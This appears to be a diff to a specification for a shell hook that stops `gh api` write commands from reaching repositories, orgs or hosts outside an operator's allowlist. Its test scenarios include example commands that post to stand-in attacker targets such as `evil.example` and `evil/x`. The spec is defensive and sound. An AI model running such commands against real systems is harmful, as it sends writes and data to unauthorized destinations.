@@ -131,6 +131,14 @@ The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNE
 - **WHEN** the command is `gh api --hostname evil.example -X POST repos/{owner}/{repo}/issues -f title=x` in a checkout of `cameronsjo/tool`
 - **THEN** the hook exits 2, because gh sends it to `evil.example`, which the allowlist does not cover
 
+#### Scenario: Placeholder owner with a literal name
+- **WHEN** the command is `gh api -X POST 'repos/{owner}/other/issues' -f title=x` in a fork checkout with origin `work-org/x` and upstream `work-org/y`, `CADENCE_ALLOWED_OWNERS=cameronsjo` and `CADENCE_ALLOWED_REPOS=work-org/x,work-org/y`; or the same command as `GH_REPO=work-org/template gh api …` in a checkout of `cameronsjo/tool` with `CADENCE_ALLOWED_REPOS=work-org/template`
+- **THEN** the hook exits 2, because gh fills the owner from the base repository and keeps the literal name, so it writes to `work-org/other`, which neither allowlist covers
+
+#### Scenario: Placeholder org
+- **WHEN** the command is `GH_REPO=evil/x gh api -X POST 'orgs/{owner}/repos' -f name=x` (or with `GH_REPO` exported or inherited), or `gh api -X POST 'orgs/{owner}/repos' -f name=x` with no `GH_REPO` in a fork checkout whose upstream owner is `work-org`, with `CADENCE_ALLOWED_OWNERS=cameronsjo`
+- **THEN** the hook exits 2 naming the org gh fills in (`evil`, or `work-org`), and the same write allows when that owner is `cameronsjo` or the checkout is `cameronsjo/tool` with no `GH_REPO`
+
 #### Scenario: Upload and GHE.com URL prefixes
 - **WHEN** the command is `gh api -X POST "https://uploads.github.com/repos/evil/x/releases/1/assets?name=a" --input a`, or `https://api.acme.ghe.com/repos/evil/x/…` with `acme.ghe.com` in `CADENCE_EXTRA_HOSTS`
 - **THEN** the hook exits 2 naming `evil/x`
